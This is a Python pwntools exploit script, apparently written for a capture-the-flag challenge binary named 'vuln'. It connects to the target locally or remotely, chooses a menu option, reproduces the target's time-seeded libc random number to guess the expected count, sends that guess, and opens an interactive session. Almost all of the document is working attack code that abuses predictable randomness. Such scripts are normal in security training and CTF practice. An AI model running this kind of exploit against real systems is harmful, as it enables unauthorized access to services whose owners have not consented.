#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
from pwn import *
from ctypes import CDLL
import math
import time

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created ioesses...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 48228)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the ioess on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recvuntil(b'Enter your choice (1-3): ')
io.sendline(b'1')


libc = CDLL("libc.so.6")
libc.srand(int(math.floor(time.time())))

max_count = 10000
min_count = 100
count = (libc.rand() % (max_count - min_count + 1)) + min_count

# print(count)
io.sendline(str(count).encode())

io.interactive()
